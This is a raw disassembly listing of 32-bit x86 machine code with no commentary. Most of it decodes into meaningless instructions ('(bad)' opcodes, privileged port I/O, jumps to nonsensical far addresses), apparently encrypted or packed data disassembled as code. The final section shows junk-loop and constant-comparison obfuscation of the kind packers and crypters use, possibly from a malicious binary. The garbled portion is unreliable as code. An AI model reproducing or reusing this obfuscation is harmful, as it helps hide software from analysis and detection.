  418a16:	or     ebp,DWORD PTR [ecx-0x1f]
  418a19:	and    DWORD PTR [eax],0x657208de
  418a1f:	lods   eax,DWORD PTR ds:[esi]
  418a20:	test   eax,0x5cd01597
  418a25:	inc    ecx
  418a26:	mov    ?,WORD PTR [ebp+0xb]
  418a29:	dec    esi
  418a2a:	fbld   TBYTE PTR [ebp-0x3a]
  418a2d:	sahf   
  418a2e:	pop    ds
  418a2f:	add    eax,0x3bb9cf5f
  418a34:	test   eax,0x9c9ac687
  418a39:	cmp    BYTE PTR [edx],bh
  418a3b:	outs   dx,BYTE PTR ds:[esi]
  418a3c:	daa    
  418a3d:	loopne 0x418a0d
  418a3f:	push   DWORD PTR [edi-0x5a]
  418a42:	mov    BYTE PTR [edi-0x46914682],bh
  418a48:	pop    edx
  418a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a4a:	xlat   BYTE PTR ds:[ebx]
  418a4b:	gs push ds
  418a4d:	mov    ebx,DWORD PTR [eax+0x319c0e15]
  418a53:	pushf  
  418a54:	and    eax,0x19f228b7
  418a59:	aam    0xe7
  418a5b:	jle    0x418a0b
  418a5d:	(bad)  
  418a5f:	push   edx
  418a60:	sub    al,0xba
  418a62:	sub    eax,0xbb07329f
  418a67:	mov    bl,BYTE PTR [edi+0x5a594069]
  418a6d:	out    0xdc,al
  418a6f:	mov    ebx,0xd451c5e0
  418a74:	and    eax,DWORD PTR [ecx-0x64]
  418a77:	in     al,dx
  418a78:	(bad)  
  418a79:	cli    
  418a7a:	stc    
  418a7b:	sar    bl,cl
  418a7d:	icebp  
  418a7e:	imul   edi,esi,0xd92b6217
  418a84:	jmp    0xf460:0x38ab3fc6
  418a8b:	dec    esp
  418a8c:	mov    ebx,0x13f22f52
  418a91:	out    0x76,eax
  418a93:	jmp    0x418a54
  418a95:	cmc    
  418a96:	cli    
  418a97:	inc    ebp
  418a98:	pop    ds
  418a99:	push   cs
  418a9a:	bound  ebp,QWORD PTR [esi+0x41c2177a]
  418aa0:	add    bh,BYTE PTR [ecx+esi*2-0x705d93d8]
  418aa7:	push   edx
  418aa8:	cmp    al,dl
  418aaa:	push   ebp
  418aab:	inc    edx
  418aac:	imul   esp,DWORD PTR [ebx-0x6d],0xf754cf7
  418ab3:	mov    esp,0x9e115904
  418ab8:	out    dx,al
  418ab9:	hlt    
  418aba:	call   0x5366454a
  418abf:	jmp    0x5d00:0x4fa488d6
  418ac6:	cld    
  418ac7:	xlat   BYTE PTR ds:[ebx]
  418ac8:	fstp   QWORD PTR [ebx]
  418aca:	push   edi
  418acb:	pop    ss
  418acc:	mov    eax,ds:0xa018736a
  418ad1:	scas   al,BYTE PTR es:[edi]
  418ad2:	std    
  418ad3:	cdq    
  418ad4:	lahf   
  418ad5:	sbb    al,0x15
  418ad7:	sbb    eax,0xc3808a34
  418adc:	inc    edi
  418add:	ret    0xff91
  418ae0:	jp     0x418ac4
  418ae2:	sbb    dh,BYTE PTR [ecx-0x30]
  418ae5:	int    0xc5
  418ae7:	and    eax,DWORD PTR [ecx-0x8]
  418aea:	ja     0x418b27
  418aec:	jbe    0x418b08
  418aee:	or     al,0x13
  418af0:	(bad)  
  418af1:	loop   0x418b27
  418af3:	stos   DWORD PTR es:[edi],eax
  418af4:	das    
  418af5:	jmp    0x418ac8
  418af7:	inc    edx
  418af8:	dec    ecx
  418af9:	pop    ss
  418afa:	or     eax,0xb049b5f
  418aff:	add    ebx,edx
  418b01:	jb     0x418b61
  418b03:	push   es
  418b04:	and    DWORD PTR [edx],edx
  418b06:	call   0xa5770eb0
  418b0b:	jb     0x418b34
  418b0d:	outs   dx,DWORD PTR ds:[esi]
  418b0e:	lods   al,BYTE PTR ds:[esi]
  418b0f:	add    ebx,edi
  418b11:	loope  0x418acd
  418b13:	cmp    eax,0xb870d144
  418b18:	sub    DWORD PTR [edi+0x7f],edx
  418b1b:	sbb    eax,0x231a5b15
  418b20:	test   DWORD PTR [ebx],eax
  418b22:	pop    esp
  418b23:	xchg   BYTE PTR [edx],ah
  418b25:	idiv   BYTE PTR [ebx+0x5e]
  418b28:	jg     0x418acf
  418b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b2b:	ins    BYTE PTR es:[edi],dx
  418b2c:	pop    ecx
  418b2d:	xchg   edx,eax
  418b2e:	test   BYTE PTR [eax+0x1f6aaedd],0xc9
  418b35:	push   es
  418b36:	mov    ecx,ss
  418b38:	ins    DWORD PTR es:[edi],dx
  418b39:	jmp    0x418ac7
  418b3b:	pop    edx
  418b3c:	pop    ds
  418b3d:	xchg   ebx,ebx
  418b3f:	mov    ah,0xa8
  418b41:	fsubr  st(4),st
  418b43:	(bad)
  418b47:	sbb    ch,cl
  418b49:	push   ebx
  418b4a:	or     DWORD PTR [ebp+esi*2+0x53],0x55ccbcc4
  418b52:	or     ebx,DWORD PTR [esi]
  418b54:	scas   al,BYTE PTR es:[edi]
  418b55:	xchg   ebx,eax
  418b56:	out    dx,eax
  418b57:	push   eax
  418b58:	adc    esi,ecx
  418b5a:	xlat   BYTE PTR ds:[ebx]
  418b5b:	dec    eax
  418b5c:	ret    
  418b5d:	in     eax,dx
  418b5e:	mov    BYTE PTR [esi-0x4ad0379c],cl
  418b64:	test   al,0xd4
  418b66:	inc    edi
  418b67:	mov    ah,0x9c
  418b69:	(bad)  
  418b6a:	xchg   ebp,eax
  418b6b:	scas   al,BYTE PTR es:[edi]
  418b6c:	push   0x747e9b48
  418b71:	std    
  418b72:	out    dx,eax
  418b73:	xchg   esp,eax
  418b74:	mov    ds:0x8f11d02c,al
  418b79:	mov    ds:0x510d07e0,eax
  418b7e:	and    cl,BYTE PTR [esi+0x5]
  418b81:	fisttp DWORD PTR [ebp+0x43c03421]
  418b87:	std    
  418b88:	lahf   
  418b89:	cmp    esp,ebp
  418b8b:	jbe    0x418bea
  418b8d:	out    dx,eax
  418b8e:	out    0xa4,al
  418b90:	sub    ch,BYTE PTR [eax+0x5d90081e]
  418b96:	js     0x418b79
  418b98:	dec    esi
  418b99:	cmp    eax,0xa09766af
  418b9e:	fucomi st,st(6)
  418ba0:	mov    dh,BYTE PTR [edi]
  418ba2:	xor    DWORD PTR ds:0xb5a1fc5a,edx
  418ba8:	jecxz  0x418be6
  418baa:	push   eax
  418bab:	push   esi
  418bac:	mov    ah,0x5c
  418bae:	clc    
  418baf:	or     DWORD PTR [edi],0x4f
  418bb2:	cmp    BYTE PTR [edx-0x445830c],dh
  418bb8:	sar    ah,cl
  418bba:	and    ch,BYTE PTR [ebx+0x59a45333]
  418bc0:	dec    esp
  418bc1:	cmp    eax,0x4f87c797
  418bc6:	sub    BYTE PTR gs:[eax-0x7a],0x54
  418bcb:	inc    ecx
  418bcc:	(bad)  
  418bcd:	dec    BYTE PTR [edx]
  418bcf:	jo     0x418c28
  418bd1:	jp     0x418b79
  418bd3:	add    DWORD PTR [ebp-0x6e],eax
  418bd6:	or     eax,0x218af5b8
  418bdb:	dec    esp
  418bdc:	shr    DWORD PTR [ecx],1
  418bde:	rol    DWORD PTR [edi],0x15
  418be1:	gs mov esp,0xb9b1c8a5
  418be7:	shr    DWORD PTR [eax-0x17],0xfa
  418beb:	nop
  418bec:	popf   
  418bed:	push   ebx
  418bee:	pop    esp
  418bef:	arpl   bp,ax
  418bf1:	sub    al,0x33
  418bf3:	and    DWORD PTR [ebp+eax*1-0x4a],esi
  418bf7:	jl     0x418c00
  418bf9:	(bad)
  418bfd:	nop
  418bfe:	or     BYTE PTR [esi],dl
  418c00:	and    BYTE PTR [esi-0x75],bh
  418c03:	mov    al,0x3b
  418c05:	pop    ebx
  418c06:	mov    esi,ebx
  418c08:	shl    DWORD PTR [eax-0x18],1
  418c0b:	sub    BYTE PTR [ecx],bl
  418c0d:	mov    dl,0xf2
  418c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c10:	lds    edi,FWORD PTR [ecx]
  418c12:	ret    
  418c13:	jg     0x418c2d
  418c15:	inc    ebp
  418c16:	xchg   edx,eax
  418c17:	cdq    
  418c18:	pop    es
  418c19:	repz lds edi,FWORD PTR [edx]
  418c1c:	cmp    ah,bh
  418c1e:	popf   
  418c1f:	sbb    ebx,edi
  418c21:	xchg   edx,eax
  418c22:	pop    edx
  418c23:	(bad)  
  418c24:	call   0xeb55857e
  418c29:	push   esp
  418c2a:	xchg   ebp,eax
  418c2b:	cs mov dl,0x48
  418c2e:	sub    al,0xaf
  418c30:	sbb    BYTE PTR [edi+0x30],bh
  418c33:	xchg   edi,eax
  418c34:	xor    al,0x91
  418c36:	push   ecx
  418c37:	test   al,0xe8
  418c39:	inc    BYTE PTR [ecx]
  418c3b:	and    eax,DWORD PTR [esi]
  418c3d:	popf   
  418c3e:	mov    edi,ebx
  418c40:	cmp    esi,DWORD PTR [eax]
  418c42:	popf   
  418c43:	inc    eax
  418c44:	(bad)
  418c49:	clc    
  418c4a:	call   0x3dbc:0x2d58a348
  418c51:	loope  0x418c2a
  418c53:	push   ebx
  418c54:	sbb    al,0x88
  418c56:	push   0xffffffea
  418c58:	mov    BYTE PTR [edx+0x327da995],al
  418c5e:	jbe    0x418c98
  418c60:	xchg   ecx,eax
  418c61:	(bad)  
  418c62:	xchg   ebp,eax
  418c63:	jne    0x418c39
  418c65:	mov    gs,WORD PTR [edi+0x31]
  418c68:	cmp    ecx,DWORD PTR [ebx]
  418c6a:	fnsave [ecx+edi*8+0x37]
  418c6e:	jo     0x418bfb
  418c70:	nop
  418c71:	mov    dh,0x1
  418c73:	pop    ebp
  418c74:	cdq    
  418c75:	arpl   bp,si
  418c77:	push   cs
  418c78:	rcr    BYTE PTR [ecx-0x56],1
  418c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c7c:	mov    cs,WORD PTR [di-0x4]
  418c80:	dec    edx
  418c81:	xlat   BYTE PTR ds:[ebx]
  418c82:	icebp  
  418c83:	mov    ah,0x2c
  418c85:	ret    
  418c86:	dec    ebp
  418c87:	inc    ecx
  418c88:	sbb    BYTE PTR [edi-0x59],ch
  418c8b:	sub    ah,bh
  418c8d:	std    
  418c8e:	fcomp  QWORD PTR [esi+esi*4+0x8441c35]
  418c95:	jbe    0x418c1c
  418c97:	inc    esi
  418c98:	aam    0xd9
  418c9a:	sub    ah,ch
  418c9c:	imul   ebp,DWORD PTR [ebp-0x579d1f32],0x50cba81c
  418ca6:	fs ins DWORD PTR es:[edi],dx
  418ca8:	push   ebx
  418ca9:	sbb    eax,0x3eddd033
  418cae:	out    dx,eax
  418caf:	jne    0x418d11
  418cb1:	mov    bl,0x7a
  418cb3:	test   DWORD PTR [edi+0x6f],ecx
  418cb6:	xor    ah,BYTE PTR [di-0x30d3]
  418cbb:	mov    WORD PTR [ecx+0xe04b466],cs
  418cc1:	push   DWORD PTR [edx]
  418cc3:	push   ecx
  418cc4:	mov    es,WORD PTR [edx]
  418cc6:	retf   
  418cc7:	sub    ah,ch
  418cc9:	aas    
  418cca:	push   esi
  418ccb:	cmp    ecx,ebp
  418ccd:	in     eax,dx
  418cce:	outs   dx,DWORD PTR ds:[esi]
  418ccf:	nop
  418cd0:	push   0xffffff89
  418cd2:	cli    
  418cd3:	jle    0x418ce2
  418cd5:	cmc    
  418cd6:	xor    BYTE PTR [bx+di],bh
  418cd9:	int3   
  418cda:	sub    al,0x31
  418cdc:	cmp    eax,DWORD PTR [ebx]
  418cde:	dec    ebp
  418cdf:	jp     0x418d4a
  418ce1:	sbb    DWORD PTR [ebp-0x3476869b],esp
  418ce7:	jl     0x418cc7
  418ce9:	jae    0x418d1b
  418ceb:	in     al,0x77
  418ced:	je     0x418d2d
  418cef:	xor    BYTE PTR [eax],ah
  418cf1:	pushf  
  418cf2:	and    ebx,edi
  418cf4:	test   BYTE PTR [esi+0xf],dh
  418cf7:	inc    DWORD PTR [edi]
  418cf9:	pop    eax
  418cfa:	lock fsub st,st(3)
  418cfd:	push   edx
  418cfe:	xor    BYTE PTR [eax+0x7b],al
  418d01:	(bad)
  418d05:	push   0x69c39f16
  418d0a:	and    DWORD PTR [edx-0xa3acc22],ebx
  418d10:	lods   al,BYTE PTR ds:[esi]
  418d11:	cmc    
  418d12:	xchg   ecx,eax
  418d13:	ins    BYTE PTR es:[edi],dx
  418d14:	(bad)
  418d17:	and    esi,ebp
  418d19:	sub    ah,BYTE PTR [edx]
  418d1b:	and    BYTE PTR [ecx+0x0],ah
  418d1e:	sbb    DWORD PTR [edi+0x6755f9fe],eax
  418d24:	add    BYTE PTR [edi],0x95
  418d27:	cdq    
  418d28:	in     al,0xdd
  418d2a:	outs   dx,BYTE PTR ds:[esi]
  418d2b:	call   0x552e:0x474499e1
  418d32:	(bad)  
  418d33:	test   eax,0xefbc3db0
  418d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d39:	aam    0x9
  418d3b:	cmp    bl,BYTE PTR [eax]
  418d3d:	(bad)  
  418d3e:	aad    0x6b
  418d40:	add    ecx,eax
  418d42:	popf   
  418d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d44:	js     0x418d42
  418d46:	shl    ecx,cl
  418d48:	cdq    
  418d49:	jno    0x418d27
  418d4b:	sti    
  418d4c:	js     0x418dbc
  418d4e:	xor    al,0xf6
  418d50:	pop    esp
  418d51:	inc    eax
  418d52:	dec    esi
  418d53:	jp     0x418cde
  418d55:	jo     0x418ce8
  418d57:	or     eax,0x43dff9df
  418d5c:	jmp    FWORD PTR [eax+0x51396689]
  418d62:	nop
  418d63:	popa   
  418d64:	push   esi
  418d65:	shl    BYTE PTR [edi+esi*4],0x39
  418d69:	cvtpi2ps xmm7,QWORD PTR [edi-0x4946378b]
  418d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d71:	(bad)  
  418d72:	cmp    eax,0xe07ba944
  418d77:	mov    ch,ch
  418d79:	jmp    0x68c5:0x3bde9eff
  418d80:	pop    ebx
  418d81:	sub    ah,0x2f
  418d84:	mov    cl,0xed
  418d86:	cdq    
  418d87:	lea    esi,[eax-0x1c07acf5]
  418d8d:	or     BYTE PTR [edi-0x7652323e],bl
  418d93:	int    0x57
  418d95:	addr16 int 0x94
  418d98:	(bad)  
  418d99:	pop    ss
  418d9a:	inc    edi
  418d9b:	pop    eax
  418d9c:	pushfw 
  418d9e:	or     eax,0x6e303906
  418da3:	xor    BYTE PTR [esi+eiz*4],0x85
  418da7:	and    BYTE PTR [edi],0x17
  418daa:	loopne 0x418e0b
  418dac:	leave  
  418dad:	stos   DWORD PTR es:[edi],eax
  418dae:	cs out dx,eax
  418db0:	dec    esp
  418db1:	or     ebx,DWORD PTR ds:0x199842ae
  418db7:	jb     0x418def
  418db9:	push   ds
  418dba:	pop    edi
  418dbb:	cmp    BYTE PTR [ebx+ebx*4],ch
  418dbe:	les    ebx,FWORD PTR [edx+0x38586aeb]
  418dc4:	mov    bl,0x2a
  418dc6:	push   es
  418dc7:	push   eax
  418dc8:	mov    ds:0xcfeac0f,eax
  418dcd:	repz mov dh,0x91
  418dd0:	js     0x418d66
  418dd2:	iret   
  418dd3:	xor    al,0xb1
  418dd5:	dec    ebx
  418dd6:	in     al,dx
  418dd7:	jecxz  0x418e2a
  418dd9:	(bad)  
  418dda:	ficom  DWORD PTR [ecx-0x1edaaa6]
  418de0:	mov    ah,0xe0
  418de2:	sbb    BYTE PTR [ebx-0x39],0x2f
  418de6:	test   al,0x93
  418de8:	push   eax
  418de9:	mov    al,0xf8
  418deb:	je     0x418d75
  418ded:	inc    edx
  418dee:	daa    
  418def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df0:	adc    ch,ah
  418df2:	dec    edi
  418df3:	(bad)
  418df6:	adc    BYTE PTR [eax],al
  418df8:	aad    0x55
  418dfa:	in     eax,dx
  418dfb:	mov    cl,0x11
  418dfd:	aas    
  418dfe:	mov    edx,0x2b9760e3
  418e03:	xor    DWORD PTR [ecx+0x6ec3fe71],esi
  418e09:	into   
  418e0a:	call   0x744ad8
  418e0f:	pop    ss
  418e10:	int3   
  418e11:	shr    BYTE PTR [eax+ebx*4],1
  418e14:	loop   0x418dc6
  418e16:	repz cmp al,0x84
  418e19:	xor    dl,BYTE PTR [ecx+0x16]
  418e1c:	(bad)  
  418e1d:	addr16 popa 
  418e1f:	push   ebp
  418e20:	mov    ?,WORD PTR [ebp-0x7d15c3f3]
  418e26:	pop    edi
  418e27:	mov    al,0xb6
  418e29:	push   esp
  418e2a:	cs inc esp
  418e2c:	sub    BYTE PTR [si+0x1a],ch
  418e30:	call   0x792c:0x43ef6c78
  418e37:	movsx  edx,WORD PTR [esi+eiz*4-0x48]
  418e3c:	pop    eax
  418e3d:	dec    esp
  418e3e:	loop   0x418dda
  418e40:	pop    ebx
  418e41:	xchg   ecx,eax
  418e42:	rol    ch,0xa
  418e45:	ins    DWORD PTR es:[edi],dx
  418e46:	adc    eax,ebx
  418e48:	or     DWORD PTR ds:0xf662a34c,0x90859f27
  418e52:	or     BYTE PTR [ebx],0x2f
  418e55:	sbb    al,0x7d
  418e57:	xor    al,0x3f
  418e59:	pmaxsw mm5,mm2
  418e5c:	pop    esi
  418e5d:	cmp    DWORD PTR [eax+0x93dcab4],0xffffffa3
  418e64:	(bad)  
  418e67:	add    eax,ebx
  418e69:	or     BYTE PTR [ecx],0x66
  418e6c:	and    BYTE PTR [ebp+0x6e0ecba9],0x9a
  418e73:	je     0x418eea
  418e75:	jecxz  0x418ef6
  418e77:	add    bh,ch
  418e79:	out    0x26,eax
  418e7b:	pusha  
  418e7c:	xor    al,0xce
  418e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e7f:	cmp    al,BYTE PTR fs:[esi]
  418e82:	not    dh
  418e84:	gs xchg esi,eax
  418e86:	shl    DWORD PTR [edi],cl
  418e88:	daa    
  418e89:	sbb    BYTE PTR [esi+0x3895d2],cl
  418e8f:	xor    DWORD PTR [eax],edx
  418e91:	lahf   
  418e92:	lds    esi,FWORD PTR [ecx+0x7c9955be]
  418e98:	cld    
  418e99:	mov    dh,0x9e
  418e9b:	mov    ch,0x5b
  418e9d:	aam    0x42
  418e9f:	pop    ss
  418ea0:	fldcw  WORD PTR [esi]
  418ea2:	push   ds
  418ea3:	sub    ch,ah
  418ea5:	pop    ebp
  418ea6:	fiadd  WORD PTR [ebx-0x27]
  418ea9:	cmp    edx,0xfffffff4
  418eac:	add    ecx,ebp
  418eae:	inc    ecx
  418eaf:	ss (bad) 
  418eb1:	gs mov edi,0xd5d3c6cc
  418eb7:	aas    
  418eb8:	jb     0x418ee6
  418eba:	pop    esi
  418ebb:	(bad)  
  418ebc:	cmp    al,0xe4
  418ebe:	(bad)  [edx]
  418ec0:	ret    0xac59
  418ec3:	mov    edx,0xc1977026
  418ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ec9:	and    eax,0x3bc6d1a3
  418ece:	scas   al,BYTE PTR es:[edi]
  418ecf:	jmp    0x28cf1503
  418ed4:	mov    eax,ds:0x1eeb9d90
  418ed9:	daa    
  418eda:	pop    ebp
  418edb:	mov    esi,0xbd4b684
  418ee0:	(bad)  
  418ee1:	sub    DWORD PTR [eax-0x32b36beb],eax
  418ee7:	jmp    0x16b21b1
  418eec:	jecxz  0x418f16
  418eee:	div    DWORD PTR [eax-0x1f]
  418ef1:	rcr    ebp,cl
  418ef3:	inc    ebx
  418ef4:	popf   
  418ef5:	das    
  418ef6:	lods   eax,DWORD PTR ds:[esi]
  418ef7:	push   esi
  418ef8:	clc    
  418ef9:	adc    BYTE PTR [eax],al
  418efb:	(bad)  
  418efc:	mov    ecx,0x2858d2ce
  418f01:	push   es
  418f02:	xor    al,0x40
  418f04:	and    esi,DWORD PTR [ecx+edi*1]
  418f07:	xchg   ebx,eax
  418f08:	out    0x5e,al
  418f0a:	out    0x58,eax
  418f0c:	push   edi
  418f0d:	fcmovnb st,st(5)
  418f0f:	stos   DWORD PTR es:[edi],eax
  418f10:	jecxz  0x418f3c
  418f12:	stos   BYTE PTR es:[edi],al
  418f13:	jge    0x418f0f
  418f15:	jge    0x418f1b
  418f17:	icebp  
  418f18:	aas    
  418f19:	inc    ecx
  418f1a:	xchg   edx,eax
  418f1b:	jbe    0x418f27
  418f1d:	push   ss
  418f1e:	jg     0x418f17
  418f20:	scas   al,BYTE PTR es:[edi]
  418f21:	xor    al,0x3f
  418f23:	mov    bh,0xa9
  418f25:	adc    DWORD PTR [ecx+ebp*1+0x21],esp
  418f29:	fdiv   DWORD PTR [esi]
  418f2b:	sbb    BYTE PTR [ebp+0x735373de],cl
  418f31:	mov    cl,ah
  418f33:	push   0x59
  418f35:	cmp    BYTE PTR [ecx-0x639c3970],bh
  418f3b:	dec    edi
  418f3c:	cmp    eax,DWORD PTR [edi-0xa]
  418f3f:	or     eax,0x3c7b3e01
  418f44:	hlt    
  418f45:	inc    si
  418f47:	retf   
  418f48:	(bad)  
  418f49:	adc    al,dh
  418f4b:	push   esi
  418f4c:	test   eax,0x9edd1e2
  418f51:	pop    edx
  418f52:	cmp    edi,DWORD PTR [esi+edi*2-0x75b256da]
  418f59:	sub    DWORD PTR [ebp-0x2f],esi
  418f5c:	test   ch,bl
  418f5e:	fidivr WORD PTR [eax-0x30743970]
  418f64:	test   al,0x57
  418f66:	dec    ebx
  418f67:	je     0x418f8c
  418f69:	push   0x44
  418f6b:	adc    al,0xae
  418f6d:	inc    edx
  418f6e:	dec    ebp
  418f6f:	jb     0x418fc8
  418f71:	arpl   WORD PTR [esi],bx
  418f73:	jo     0x418f7e
  418f75:	call   0xaac2:0x885337e1
  418f7c:	xor    DWORD PTR [eax],ebp
  418f7e:	stos   DWORD PTR es:[edi],eax
  418f7f:	and    edi,ebx
  418f81:	inc    ecx
  418f82:	mov    bh,0x57
  418f84:	and    BYTE PTR [ecx-0x31],dl
  418f87:	push   ebp
  418f88:	pop    ss
  418f89:	inc    esp
  418f8a:	jp     0x418f70
  418f8c:	dec    eax
  418f8d:	retf   0x7561
  418f90:	sti    
  418f91:	outs   dx,DWORD PTR ds:[esi]
  418f92:	mul    DWORD PTR [esi-0x2e395db2]
  418f98:	ss je  0x418fa8
  418f9b:	ret    
  418f9c:	cmp    eax,0xa0129f15
  418fa1:	jg     0x418fc5
  418fa3:	inc    edx
  418fa4:	sti    
  418fa5:	adc    BYTE PTR [edx],al
  418fa7:	(bad)  
  418fa8:	cli    
  418fa9:	fcomp  DWORD PTR [esi+0x5c]
  418fac:	popa   
  418fad:	hlt    
  418fae:	xor    BYTE PTR ds:0xc0f5dccb,dh
  418fb4:	das    
  418fb5:	out    dx,eax
  418fb6:	daa    
  418fb7:	scas   eax,DWORD PTR es:[edi]
  418fb8:	test   al,0xfd
  418fba:	(bad)  
  418fbb:	lods   eax,DWORD PTR ds:[esi]
  418fbc:	sbb    al,0x4b
  418fbe:	rcr    BYTE PTR [edi+0x2c],0xac
  418fc2:	cdq    
  418fc3:	neg    BYTE PTR [edx+0x57]
  418fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc7:	jl     0x418f80
  418fc9:	pop    DWORD PTR [ebx-0x3f578314]
  418fcf:	ds pop ebp
  418fd1:	mov    cl,0xce
  418fd3:	das    
  418fd4:	pop    ebx
  418fd5:	mov    bh,0xc5
  418fd7:	push   edi
  418fd8:	push   eax
  418fd9:	push   edx
  418fda:	pop    esi
  418fdb:	nop
  418fdc:	div    DWORD PTR [edi+0x4ea260bb]
  418fe2:	fdivr  DWORD PTR [eax]
  418fe4:	add    al,ch
  418fe6:	jg     0x418f84
  418fe8:	adc    al,0xf0
  418fea:	(bad)  
  418feb:	test   al,0x2d
  418fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fee:	jno    0x41904d
  418ff0:	adc    BYTE PTR [eax+0x2df26534],ah
  418ff6:	in     eax,dx
  418ff7:	scas   eax,DWORD PTR es:[edi]
  418ff8:	fwait
  418ff9:	xor    esi,ebx
  418ffb:	call   0x5e6ff7a5
  419000:	cli    
  419001:	xchg   esi,eax
  419002:	pop    esi
  419003:	jle    0x419075
  419005:	lea    edi,[ebx+edi*8-0x47df4327]
  41900c:	test   eax,0x8dfd9200
  419011:	int    0x4
  419013:	xor    DWORD PTR [ebp+0x5c],ebx
  419016:	add    DWORD PTR [ebp+0x3c],0x33
  41901a:	les    edi,FWORD PTR [edx+0x3272db]
  419020:	add    DWORD PTR ds:0x42a008,0x5e50
  41902a:	add    edi,edx
  41902c:	mov    DWORD PTR ds:0x42a000,0x7626
  419036:	cmp    DWORD PTR [eax],edi
  419038:	je     0x419045
  41903e:	mov    eax,DWORD PTR [eax]
  419040:	jmp    0x41b79b
  419045:	mov    eax,DWORD PTR [ebp+0x18]
  419048:	mov    DWORD PTR ds:0x42b004,0x29bc
  419052:	cmp    eax,esi
  419054:	jne    0x41906e
  41905a:	push   0xf89c85b5
  41905f:	mov    DWORD PTR ds:0x42a018,0x6618
  419069:	jmp    0x41b78a
  41906e:	mov    esi,DWORD PTR [ebp+0x18]
  419071:	mov    eax,0xf89c85b4
  419076:	mov    DWORD PTR ds:0x42a010,0x8ff
  419080:	cmp    esi,eax
  419082:	mov    DWORD PTR ds:0x42d010,0x7cdb
  41908c:	jne    0x41b77a
  419092:	mov    eax,DWORD PTR [ebp+0x10]
  419095:	xor    esi,esi
  419097:	add    esi,DWORD PTR ds:0x423e22
  41909d:	mov    esi,DWORD PTR [esi]
  41909f:	and    DWORD PTR ds:0x42a010,esi
  4190a5:	xor    eax,ecx
  4190a7:	mov    DWORD PTR ds:0x42c01c,0x15
  4190b1:	cmp    DWORD PTR ds:0x42c01c,0x0
  4190b8:	je     0x419106
  4190be:	cmp    DWORD PTR ds:0x42c01c,0x7
  4190c5:	jne    0x4190d4
  4190cb:	push   DWORD PTR [ebp-0xc]
  4190ce:	call   DWORD PTR ds:0x425030
  4190d4:	cmp    DWORD PTR ds:0x42c01c,0x8
  4190db:	jne    0x4190ee
  4190e1:	mov    esi,DWORD PTR ds:0x42c01c
  4190e7:	dec    esi
  4190e8:	mov    DWORD PTR ds:0x42c01c,esi
  4190ee:	mov    esi,DWORD PTR ds:0x42c01c
  4190f4:	dec    esi
  4190f5:	mov    DWORD PTR ds:0x42c01c,esi
  4190fb:	jmp    0x4190b1
  419100:	neg    DWORD PTR ds:0x42b00c
  419106:	add    eax,edx
  419108:	and    DWORD PTR ds:0x42b004,0x0
  419112:	mov    esi,DWORD PTR ds:0x42b004
  419118:	inc    esi
  419119:	mov    DWORD PTR ds:0x42b004,esi
  41911f:	cmp    DWORD PTR ds:0x42b004,0x4
  419126:	jne    0x41913c
  41912c:	push   0x6d2e
  419131:	push   0x438c
  419136:	call   DWORD PTR ds:0x425034
  41913c:	cmp    DWORD PTR ds:0x42b004,0x3
  419143:	jne    0x419156
  419149:	mov    esi,DWORD PTR ds:0x42b004
  41914f:	inc    esi
  419150:	mov    DWORD PTR ds:0x42b004,esi
  419156:	cmp    DWORD PTR ds:0x42b004,0x10
  41915d:	jb     0x419112
  419163:	mov    DWORD PTR [ebp-0x18],eax
  419166:	and    DWORD PTR ds:0x42d014,0x0
  419170:	mov    eax,ds:0x42d014
  419175:	inc    eax
  419176:	mov    ds:0x42d014,eax
  41917b:	cmp    DWORD PTR ds:0x42d014,0x1a
  419182:	jne    0x41919d
  419188:	push   0x424536
  41918d:	push   0x4244fc
  419192:	push   0x87a6
  419197:	call   DWORD PTR ds:0x42503c
  41919d:	cmp    DWORD PTR ds:0x42d014,0x15
  4191a4:	jb     0x419170
  4191aa:	inc    esi
  4191ab:	mov    eax,DWORD PTR [ebp+0xc]
  4191ae:	mov    DWORD PTR ds:0x42c000,0x10
  4191b8:	cmp    DWORD PTR ds:0x42c000,0x0
  4191bf:	je     0x419213
  4191c5:	cmp    DWORD PTR ds:0x42c000,0x5
  4191cc:	jne    0x4191e5
  4191d2:	push   DWORD PTR [ebp-0x14]
  4191d5:	push   0x594c
  4191da:	push   0x7c33
  4191df:	call   DWORD PTR ds:0x425040
  4191e5:	cmp    DWORD PTR ds:0x42c000,0x6
  4191ec:	jne    0x4191ff
  4191f2:	mov    esi,DWORD PTR ds:0x42c000
  4191f8:	dec    esi
  4191f9:	mov    DWORD PTR ds:0x42c000,esi
  4191ff:	xor    esi,esi
  419201:	add    esi,DWORD PTR ds:0x42c000
  419207:	dec    esi
  419208:	mov    DWORD PTR ds:0x42c000,esi
  41920e:	jmp    0x4191b8
  419213:	mov    esi,DWORD PTR [ebp-0x8]
  419216:	and    DWORD PTR ds:0x429020,0x232c
  419220:	xor    eax,ecx
  419222:	inc    DWORD PTR ds:0x429028
  419228:	add    eax,edx
  41922a:	and    DWORD PTR ds:0x42a008,0x32e2
  419234:	imul   eax,DWORD PTR [esi]
  419237:	mov    esi,DWORD PTR [ebp+0x8]
  41923a:	xor    esi,ecx
  41923c:	add    esi,edx
  41923e:	cmp    esi,eax
  419240:	mov    eax,DWORD PTR [ebp-0x4]
  419243:	push   ebx
  419244:	je     0x419263
  41924a:	mov    esi,DWORD PTR [ebp-0x18]
  41924d:	add    DWORD PTR [eax],esi
  41924f:	mov    eax,DWORD PTR [ebp-0x4]
  419252:	mov    esi,DWORD PTR [ebp+0xc]
  419255:	xor    esi,ecx
  419257:	add    esi,edx
  419259:	imul   esi,DWORD PTR [eax]
  41925c:	mov    DWORD PTR [eax],esi
  41925e:	jmp    0x419268
  419263:	mov    esi,DWORD PTR [ebp+0x14]
  419266:	xor    DWORD PTR [eax],esi
  419268:	mov    eax,DWORD PTR [ebp-0x4]
  41926b:	mov    edi,DWORD PTR [ebp+0x10]
  41926e:	xor    edi,ecx
  419270:	mov    esi,0xffcd8d25
